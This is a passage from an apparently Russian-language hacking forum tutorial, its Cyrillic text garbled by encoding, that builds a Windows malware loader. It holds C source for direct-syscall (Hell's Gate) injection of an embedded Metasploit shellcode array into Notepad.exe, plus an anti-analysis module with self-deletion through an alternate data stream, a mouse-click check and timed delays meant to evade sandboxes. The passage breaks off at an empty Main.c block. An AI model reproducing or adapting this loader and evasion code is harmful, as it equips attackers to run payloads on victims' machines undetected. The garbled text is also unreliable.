–ª–æ–∫–∞–ª—å–Ω–æ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;// –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π –¥–ª—è –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –≤ –ª–æ–∫–∞–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å
//
#define TARGET_PROCESS    L&quot;Notepad.exe&quot;// x64 calc metasploit
unsigned char Payload [] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x20, 0x2F, 0x69, 0x20, 0x2F,
    0x74, 0x31, 0x20, 0x2F, 0x64, 0x65, 0x6C, 0x20, 0x22, 0x25, 0x50, 0x52,
    0x4F, 0x47, 0x52, 0x41, 0x4D, 0x46, 0x49, 0x4C, 0x45, 0x25, 0x22, 0x00,
    0x00
};
// –í—Ç–æ—Ä–∏—á–Ω—ã–π –ø–æ—Ç–æ–∫
DWORD WINAPI MainThread(LPVOID lpParam) {
    UNREFERENCED_PARAMETER(lpParam);

    printf(&quot;\n\n[~] –ó–∞–ø—É—â–µ–Ω–æ \n&quot;);

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤
    if (!InitializeSyscalls()) {
        printf(&quot;[!] –ù–µ —É–¥–∞–ª–æ—Å—å –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã \n&quot;);
        return FALSE;
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
    HANDLE hProcess = NULL;
    DWORD dwPid = NULL;
    if (TARGET_PROCESS) {
        if (!GetRemoteProcessHandle(TARGET_PROCESS, &amp;dwPid, &amp;hProcess)) {
            printf(&quot;[!] –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ \n&quot;);
            return FALSE;
        }
        printf(&quot;[+] –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –ø–æ–ª—É—á–µ–Ω : %d \n&quot;, dwPid);
    }
    else {
        hProcess = (HANDLE)1; // –ü—Å–µ–≤–¥–æ-–¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏
    }

    // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –≤–Ω–µ–¥—Ä–µ–Ω–∏—è
    if (!RemoteMappingInjectionViaSyscalls(hProcess, Payload, sizeof(Payload), !TARGET_PROCESS)) {
        printf(&quot;[!] –í–Ω–µ–¥—Ä–µ–Ω–∏–µ Payload –Ω–µ —É–¥–∞–ª–æ—Å—å \n&quot;);
        return FALSE;
    }

    printf(&quot;[+] –í—ã–ø–æ–ª–Ω–µ–Ω–æ \n&quot;);

    // –û–∂–∏–¥–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è
    if (TARGET_PROCESS) {
        WaitForSingleObject(hProcess, INFINITE);
    }

    return TRUE;
}
int main() {
    HANDLE hThread = CreateThread(NULL, 0, MainThread, NULL, 0, NULL);
    if (hThread == NULL) {
        printf(&quot;[!] –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å –ø–æ—Ç–æ–∫ \n&quot;);
        return 1;
    }
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return 0;
}</code></pre>
	</div>
</div><br />
<b>–†–µ–∑—É–ª—å—Ç–∞—Ç—ã:<br />
<br />
–£–¥–∞–ª–µ–Ω–Ω–∞—è –∏–Ω—ä–µ–∫—Ü–∏—è</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788183250.png"
		data-src="https://osint42.org/attachments/1746788183250-png.263/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788183250-png.263/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788183250.png"
			title="1746788183250.png"
			width="1656" height="743" loading="lazy" />
	</div><br />
<br />
<br />
<b>–õ–æ–∫–∞–ª—å–Ω–∞—è –∏–Ω—ä–µ–∫—Ü–∏—è</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788190362.png"
		data-src="https://osint42.org/attachments/1746788190362-png.264/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788190362-png.264/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788190362.png"
			title="1746788190362.png"
			width="1729" height="756" loading="lazy" />
	</div><br />
<br />
<b>–§—É–Ω–∫—Ü–∏–∏ –∞–Ω—Ç–∏–∞–Ω–∞–ª–∏–∑–∞ </b><br />
<br />
–î–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–π –∞–Ω—Ç–∏–∞–Ω–∞–ª–∏–∑–∞ —Å–æ–∑–¥–∞–π—Ç–µ –Ω–æ–≤—ã–π —Ñ–∞–π–ª —Å –∏–º–µ–Ω–µ–º AntiAnalysis.c. –≠—Ç–æ—Ç —Ñ–∞–π–ª –±—É–¥–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Å–ª–µ–¥—É—é—â—É—é —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å:<br />
<ol>
<li data-xf-list-type="ol">–§—É–Ω–∫—Ü–∏—è —Å–∞–º–æ—É–¥–∞–ª–µ–Ω–∏—è.</li>
<li data-xf-list-type="ol">–§—É–Ω–∫—Ü–∏—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ —â–µ–ª—á–∫–æ–≤ –º—ã—à–∏.</li>
<li data-xf-list-type="ol">–§—É–Ω–∫—Ü–∏—è –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º NtDelayExecution.</li>
</ol><b>AntiAnalysis.c</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;

// –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —Ö—É–∫–∞
HHOOK g_hMouseHook = NULL;
DWORD g_dwMouseClicks = NULL;

// Callback-—Ñ—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è –ø—Ä–∏ –∫–∞–∂–¥–æ–º –∫–ª–∏–∫–µ –º—ã—à–∏
LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
        printf(&quot;[+] –ó–∞–ø–∏—Å—å –∫–ª–∏–∫–∞ –º—ã—à–∏\n&quot;);
        g_dwMouseClicks++;
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

    MSG Msg = { 0 };

    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ö—É–∫–∞
    g_hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookEvent,
        NULL,
        NULL
    );
    if (!g_hMouseHook) {
        printf(&quot;[!] SetWindowsHookExW –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d\n&quot;, GetLastError());
    }

    // –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–µ–æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã—Ö —Å–æ–±—ã—Ç–∏–π
    while (GetMessageW(&amp;Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}

BOOL DeleteSelf() {

    WCHAR szPath[MAX_PATH * 2] = { 0 };
    FILE_DISPOSITION_INFO Delete = { 0 };
    HANDLE hFile = INVALID_HANDLE_VALUE;
    PFILE_RENAME_INFO pRename = NULL;
    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
    SIZE_T sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ–≥–æ –±—É—Ñ–µ—Ä–∞ –¥–ª—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã &#039;FILE_RENAME_INFO&#039;
    pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
    if (!pRename) {
        printf(&quot;[!] HeapAlloc –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d\n&quot;, GetLastError());
        return FALSE;
    }

    // –û—á–∏—Å—Ç–∫–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä
    ZeroMemory(szPath, sizeof(szPath));
    ZeroMemory(&amp;Delete, sizeof(FILE_DISPOSITION_INFO));

    // –ú–∞—Ä–∫–∏—Ä–æ–≤–∫–∞ —Ñ–∞–π–ª–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è (–∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤–æ –≤—Ç–æ—Ä–æ–º –≤—ã–∑–æ–≤–µ SetFileInformationByHandle)
    Delete.DeleteFile = TRUE;

    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∏–º–µ–Ω–∏ –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∏ –µ–≥–æ —Ä–∞–∑–º–µ—Ä–∞ –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ &#039;FILE_RENAME_INFO&#039;
    pRename-&gt;FileNameLength = sizeof(NewStream);
    RtlCopyMemory(pRename-&gt;FileName, NewStream, sizeof(NewStream));

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–º–µ–Ω–∏ —Ç–µ–∫—É—â–µ–≥–æ —Ñ–∞–π–ª–∞
    if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
        printf(&quot;[!] GetModuleFileNameW –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d\n&quot;, GetLastError());
        return FALSE;
    }

    // –û—Ç–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ç–µ–∫—É—â–µ–≥–æ —Ñ–∞–π–ª–∞
    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf(&quot;[!] CreateFileW [R] –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d\n&quot;, GetLastError());
        return FALSE;
    }

    wprintf(L&quot;[i] –ü–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–∏–µ :$DATA –≤ %s  ...&quot;, NEW_STREAM);

    // –ü–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–∏–µ –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö
    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
        printf(&quot;[!] SetFileInformationByHandle [R] –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d\n&quot;, GetLastError());
        return FALSE;
    }
    wprintf(L&quot;[+] –ì–û–¢–û–í–û\n&quot;);

    CloseHandle(hFile);

    // –û—Ç–∫—Ä—ã—Ç–∏–µ –Ω–æ–≤–æ–≥–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ç–µ–∫—É—â–µ–≥–æ —Ñ–∞–π–ª–∞
    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE &amp;&amp; GetLastError() == ERROR_FILE_NOT_FOUND) {
        // –ï—Å–ª–∏ —Ñ–∞–π–ª —É–∂–µ —É–¥–∞–ª–µ–Ω
        return TRUE;
    }
    if (hFile == INVALID_HANDLE_VALUE) {
        printf(&quot;[!] CreateFileW [D] –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d\n&quot;, GetLastError());
        return FALSE;
    }

    wprintf(L&quot;[i] –£–î–ê–õ–ï–ù–ò–ï ...&quot;);

    // –ú–∞—Ä–∫–∏—Ä–æ–≤–∫–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –ø–æ—Å–ª–µ –∑–∞–∫—Ä—ã—Ç–∏—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ñ–∞–π–ª–∞
    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &amp;Delete, sizeof(Delete))) {
        printf(&quot;[!] SetFileInformationByHandle [D] –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d\n&quot;, GetLastError());
        return FALSE;
    }
    wprintf(L&quot;[+] –ì–û–¢–û–í–û\n&quot;);

    CloseHandle(hFile);

    // –û—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–≥–æ –±—É—Ñ–µ—Ä–∞
    HeapFree(GetProcessHeap(), 0, pRename);

    return TRUE;
}

typedef NTSTATUS(NTAPI* fnNtDelayExecution)(
    BOOLEAN Alertable,
    PLARGE_INTEGER DelayInterval
    );

BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {

    // –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –º–∏–Ω—É—Ç –≤ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥—ã
    DWORD dwMilliSeconds = ftMinutes * 60000;
    LARGE_INTEGER DelayInterval = { 0 };
    LONGLONG Delay = NULL;
    NTSTATUS STATUS = NULL;
    fnNtDelayExecution pNtDelayExecution = (fnNtDelayExecution)GetProcAddress(GetModuleHandle(L&quot;NTDLL.DLL&quot;), &quot;NtDelayExecution&quot;);
    DWORD _T0 = NULL;
    DWORD _T1 = NULL;

    printf(&quot;[i] –ó–∞–¥–µ—Ä–∂–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º \&quot;NtDelayExecution\&quot; –Ω–∞ %0.3d —Å–µ–∫—É–Ω–¥&quot;, (dwMilliSeconds / 1000));

    // –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –∏–∑ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥ –≤ 100-–Ω–∞–Ω–æ—Å–µ–∫—É–Ω–¥–Ω—ã–µ –∏–Ω—Ç–µ—Ä–≤–∞–ª—ã –≤—Ä–µ–º–µ–Ω–∏ (–æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–µ)
    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = -Delay;

    _T0 = GetTickCount64();

    // –ü–∞—É–∑–∞ –Ω–∞ &#039;dwMilliSeconds&#039; –º—Å
    if ((STATUS = pNtDelayExecution(FALSE, &amp;DelayInterval)) != 0x00 &amp;&amp; STATUS != STATUS_TIMEOUT) {
        printf(&quot;[!] NtDelayExecution –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X\n&quot;, STATUS);
        return FALSE;
    }

    _T1 = GetTickCount64();

    // –ï—Å–ª–∏ –ø—Ä–æ—à–ª–æ –ø–æ –∫—Ä–∞–π–Ω–µ–π –º–µ—Ä–µ &#039;dwMilliSeconds&#039; –º—Å, —Ç–æ &#039;DelayExecutionVia_NtDE&#039; —É—Å–ø–µ—à–Ω–æ, –≤ –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ –Ω–µ—É–¥–∞—á–∞
    if ((DWORD)(_T1 - _T0) &lt; dwMilliSeconds)
        return FALSE;

    printf(&quot;\n\t&gt;&gt; _T1 - _T0 = %d\n&quot;, (DWORD)(_T1 - _T0));

    printf(&quot;[+] –ì–û–¢–û–í–û\n&quot;);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏—è AntiAnalysis</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// using the &#039;extern&#039; keyword, because this variable is already defined in the &#039;Inject.c&#039; file
extern VX_TABLE g_Sys;

//...

BOOL AntiAnalysis(DWORD dwMilliSeconds) {

    HANDLE                    hThread            = NULL;
    NTSTATUS                STATUS            = NULL;
    LARGE_INTEGER            DelayInterval    = { 0 };
    FLOAT                    i                = 1;
    LONGLONG                Delay            = NULL;

    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = -Delay;

    // Self-deletion
    if (!DeleteSelf()) {
        // we dont care for the result - but you can change this if you want
    }

    // Try 10 times, after that return FALSE
    while (i &lt;= 10) {

        printf(&quot;[#] Monitoring Mouse-Clicks For %d Seconds - Need 6 Clicks To Pass\n&quot;, (dwMilliSeconds / 1000));

        // Creating a thread that runs &#039;MouseClicksLogger&#039; function
        HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
        if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
            printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
            return FALSE;
        }

        // Waiting for the thread for &#039;dwMilliSeconds&#039;
        HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
        if ((STATUS = HellDescent(hThread, FALSE, &amp;DelayInterval)) != 0 &amp;&amp; STATUS != STATUS_TIMEOUT) {
            printf(&quot;[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n&quot;, STATUS);
            return FALSE;
        }

        HellsGate(g_Sys.NtClose.wSystemCall);
        if ((STATUS = HellDescent(hThread)) != 0) {
            printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
            return FALSE;
        }

        // Unhooking
        if (g_hMouseHook &amp;&amp; !UnhookWindowsHookEx(g_hMouseHook)) {
            printf(&quot;[!] UnhookWindowsHookEx Failed With Error : %d \n&quot;, GetLastError());
            return FALSE;
        }

        // Delaying execution for specific amount of time
        if (!DelayExecutionVia_NtDE((FLOAT)(i / 2)))
            return FALSE;

        // If the user clicked more than 5 times, we return true
        if (g_dwMouseClicks &gt; 5)
            return TRUE;

        // If not, we reset the mouse-clicks variable, and monitor the mouse-clicks again
        g_dwMouseClicks = NULL;

        // Increment &#039;i&#039;, so that next time &#039;DelayExecutionVia_NtDE&#039; will wait longer
        i++;
    }

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–ö—Ä–∞—Ç–∫–æ –æ —Ñ—É–Ω–∫—Ü–∏–∏ AntiAnalysis: </b><br />
<br />
1. –û–Ω–∞ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç dwMilliSeconds –≤ –∫–∞—á–µ—Å—Ç–≤–µ –≤—Ö–æ–¥–Ω–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤—Ä–µ–º–µ–Ω–∏ –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –∫–ª–∏–∫–æ–≤ –º—ã—à–∏.<br />
<br />
2. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –Ω–∞—á–∏–Ω–∞–µ—Ç —Å –≤—ã–∑–æ–≤–∞ DeleteSelf –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è —Ñ–∞–π–ª–∞ —Å –¥–∏—Å–∫–∞.<br />
<br />
3. –ó–∞—Ç–µ–º –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Ü–∏–∫–ª while, –∫–æ—Ç–æ—Ä—ã–π –∑–∞–ø—É—Å–∫–∞–µ—Ç MouseClicksLogger —á–µ—Ä–µ–∑ –Ω–æ–≤—ã–π –ø–æ—Ç–æ–∫ –∏ –∂–¥–µ—Ç –µ–≥–æ –≤ —Ç–µ—á–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏, —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –≤ dwMilliSeconds.<br />
<br />
4. –ü–æ—Å–ª–µ –∏—Å—Ç–µ—á–µ–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏ –ø–æ—Ç–æ–∫–∞ —Ö—É–∫–∏ —É–¥–∞–ª—è—é—Ç—Å—è, –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –∑–∞–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –Ω–∞ –ø–æ–ª–æ–≤–∏–Ω—É –∑–Ω–∞—á–µ–Ω–∏—è –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π i, –≥–¥–µ i –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –∑–Ω–∞—á–µ–Ω–∏–µ –¥–ª—è –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤ –º–∏–Ω—É—Ç–∞—Ö.<br />
<br />
5. –ó–∞—Ç–µ–º —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –æ–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∫–ª–∏–∫–æ–≤ –º—ã—à–∏ –ø–µ—Ä–µ–¥ –∑–∞–¥–µ—Ä–∂–∫–æ–π. –ï—Å–ª–∏ –∏—Ö –º–µ–Ω—å—à–µ 5, —Ç–æ –≥–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –º–æ–Ω–∏—Ç–æ—Ä–∞ –∫–ª–∏–∫–æ–≤ –º—ã—à–∏, g_dwMouseClicks, —Å–±—Ä–∞—Å—ã–≤–∞–µ—Ç—Å—è, —á—Ç–æ–±—ã —Å–ª–µ–¥—É—é—â–∏–π —Ü–∏–∫–ª –Ω–∞—á–∞–ª —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–ª–∏–∫–æ–≤ –º—ã—à–∏ —Å–Ω–∞—á–∞–ª–∞.<br />
<br />
6. –£–≤–µ–ª–∏—á–µ–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π i –∑–∞—Å—Ç–∞–≤–ª—è–µ—Ç –ø–æ—Å–ª–µ–¥—É—é—â—É—é —Ñ—É–Ω–∫—Ü–∏—é DelayExecutionVia_NtDE –∂–¥–∞—Ç—å –¥–æ–ª—å—à–µ, —Å–æ–∑–¥–∞–≤–∞—è —Å–ø–æ—Å–æ–± –∑–∞–¥–µ—Ä–∂–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤ –ø–µ—Å–æ—á–Ω–∏—Ü–µ.<br />
<br />
common.h<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// –ù–∞–∑–≤–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö
#define NEW_STREAM L&quot;:RuSfera&quot;

BOOL AntiAnalysis(DWORD dwMilliSeconds);</code></pre>
	</div>
</div><br />
Main.c:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
